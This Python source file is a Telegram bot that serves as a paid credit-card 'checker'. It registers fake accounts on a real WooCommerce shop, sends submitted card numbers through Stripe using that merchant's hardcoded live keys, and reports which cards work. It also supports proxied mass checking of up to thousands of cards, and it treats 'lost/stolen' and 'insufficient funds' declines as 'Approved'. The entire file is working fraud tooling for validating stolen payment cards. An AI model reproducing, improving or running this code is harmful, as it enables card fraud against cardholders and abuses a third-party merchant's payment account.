import re
import json
import requests
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import random
import string
from BOT.tools.proxy import get_proxy

# Stripe Keys from original API
S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
S_ACC = 'acct_1Mpulb2El1QixccJ'

user_locks = {}


class StripeGate:
    """Stripe Auth Gate using redbluechair.com - Real Checking (Original API)"""
    
    def __init__(self, proxy=None):
        self.s = requests.Session()
        self.proxy = proxy
        
        # Apply proxy to session (but NOT for Stripe tokenization)
        if proxy:
            self.s.proxies = {'http': proxy, 'https': proxy}
        
        self.s.headers.update({
            'authority': 'redbluechair.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'origin': 'https://redbluechair.com',
            'referer': 'https://redbluechair.com/my-account/',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })
    
    def rnd_str(self, l=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
    
    def reg(self):
        """Register new account on redbluechair.com"""
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/', timeout=30)
            n = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
            if not n:
                return False
            n = n.group(1)
            rnd = self.rnd_str()
            dt = {
                'email': f'user{rnd}@gmail.com',
                'password': f'Pass{rnd}!!',
                'register': 'Register',
                'woocommerce-register-nonce': n,
                '_wp_http_referer': '/my-account/'
            }
            r2 = self.s.post('https://redbluechair.com/my-account/', data=dt, timeout=30)
            return "Log out" in r2.text
        except:
            return False
    
    def tok(self, cc, mm, yy, cvv):
        """Create Stripe payment method token (NO PROXY - as per original)"""
        try:
            h = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.s.headers['user-agent']
            }
            d = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'key': S_PK,
                '_stripe_account': S_ACC,
                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                'referrer': 'https://redbluechair.com',
                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
            }
            # Stripe Tokenization (No Proxy Here Always)
            r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d, timeout=30)
            result = r.json()
            if 'id' in result:
                return True, result['id']
            elif 'error' in result:
                error_msg = result['error'].get('message', 'Token Error')
                error_code = result['error'].get('code', '')
                # Check for expired card at token level
                if 'expired' in error_msg.lower() or 'expired' in error_code.lower():
                    return False, "Expired Card"
                elif 'invalid' in error_msg.lower():
                    return False, error_msg[:40]
                return False, error_msg[:40]
            return False, "Token Error"
        except Exception as e:
            return False, str(e)[:40]
    
    def add(self, pm):
        """Add payment method and get response"""
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/', timeout=30)
            txt = r1.text
            n = None
            m1 = re.search(r'"createSetupIntentNonce":"([^"]+)"', txt)
            if m1: n = m1.group(1)
            if not n:
                m2 = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', txt)
                if m2: n = m2.group(1)
            if not n:
                m3 = re.search(r'"create_setup_intent_nonce":"([a-z0-9]+)"', txt)
                if m3: n = m3.group(1)
            
            if not n:
                return "Declined ❌", "Nonce Error"

            h = self.s.headers.copy()
            h.update({'x-requested-with': 'XMLHttpRequest', 'referer': 'https://redbluechair.com/my-account/add-payment-method/'})
            
            pl = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, pm),
                '_ajax_nonce': (None, n)
            }
            
            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl, timeout=30)
            js = r2.json()
            
            if js.get('success') is True:
                return "Approved ✅", "Succeeded"
            else:
                msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                msg_upper = msg.upper()
                
                # Expired card
                if 'EXPIRED' in msg_upper or 'EXPIRATION' in msg_upper:
                    return "Declined ❌", "Expired Card"
                # CVV errors = Approved
                elif any(kw in msg_upper for kw in ['CVC', 'CVV', 'SECURITY CODE']):
                    return "CCN ✅", "CVC Mismatch", msg[:40]
                # Insufficient funds = Approved
                elif 'INSUFFICIENT' in msg_upper:
                    return "Approved ✅", "Insufficient Funds"
                # Do not honor = Approved
                elif 'DO NOT HONOR' in msg_upper:
                    return "Approved ✅", "Do Not Honor"
                # Lost/Stolen = Approved
                elif 'LOST' in msg_upper or 'STOLEN' in msg_upper:
                    return "Approved ✅", msg[:40]
                # 3D Secure = Approved
                elif any(kw in msg_upper for kw in ['3D', 'AUTHENTICATION', 'SECURE']):
                    return "Approved ✅", "3D Secure"
                # Invalid card = Declined
                elif 'INVALID' in msg_upper or 'INCORRECT' in msg_upper:
                    return "Declined ❌", msg[:40]
                else:
                    return "Declined ❌", msg[:40]
        except Exception as e:
            return "Declined ❌", str(e)[:40]
    
    def check_card(self, cc, mm, yy, cvv):
        """Full check flow"""
        try:
            # Step 1: Register
            if not self.reg():
                return "Declined ❌", "Registration Failed"
            
            # Step 2: Tokenize
            tok_success, tok_result = self.tok(cc, mm, yy, cvv)
            if not tok_success:
                # Return the error from tokenization (including expired)
                if "Expired" in tok_result:
                    return "Declined ❌", "Expired Card"
                return "Declined ❌", tok_result
            
            # Step 3: Add payment method
            return self.add(tok_result)
            
        except Exception as e:
            return "Declined ❌", str(e)[:40]


def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def check_stripe_auth(cc, mm, yy, cvv, proxy=None):
    """Full Stripe Auth check"""
    gate = StripeGate(proxy=proxy)
    return gate.check_card(cc, mm, yy, cvv)

def is_free_user(user_id):
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True


@Client.on_message(filters.command("au") & ~filters.edited)
async def stripe_auth_single(client, message):
    """Single card Stripe Auth checker"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>✦ [$au] | Processing..!</pre>\n━━━━━━━━━━━━\n[•] Card- <code>{fullcc}</code>\n[•] Gate - <code>Stripe Auth</code>",
            reply_to_message_id=message.id
        )
        
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        # Clickable username
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        final_msg = f"""<b>[#StripeAuth] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Stripe Auth</code>
<b>[•] Status-</b> <code>{status}</code>
<b>[•] Response-</b> <code>{response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url="https://t.me/gitsus")
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mau") & ~filters.edited)
async def stripe_auth_mass(client, message):
    """Mass Stripe Auth checker"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mau is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        # Card limits based on plan - Ultimate: 100, VIP: 50
        if plan.upper() == "ULTIMATE":
            mlimit = 100
        elif plan == "VIP":
            mlimit = 50
        else:
            mlimit = plan_info.get("mlimit", 10)
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            all_cards = all_cards[:mlimit]
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        # Clickable username
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> [<code>{plan} {badge}</code>]"
        
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Stripe Auth</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"[•] <b>Card:</b> <code>{card}</code>\n"
                    f"[•] <b>Status:</b> <code>{status}</code>\n"
                    f"[•] <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                # Show all results, cap at 20 during progress
                try:
                    display_results = final_results if len(final_results) <= 20 else final_results[-20:]
                    await loader_msg.edit(
                        f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
                        + "\n".join(display_results) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[ﾒ] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Show ALL results
        final_text = f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
        final_text += f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[ﾒ] Checked By:</b> {checked_by}"
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url="https://t.me/gitsus")
            ]
        ])
        
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/mau_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Stripe Auth Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$mau] | M-Stripe Auth Results</pre>\n"
                        f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
                        f"<b>[ﾒ] Checked By:</b> {checked_by}",
                reply_to_message_id=message.id,
                reply_markup=buttons
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
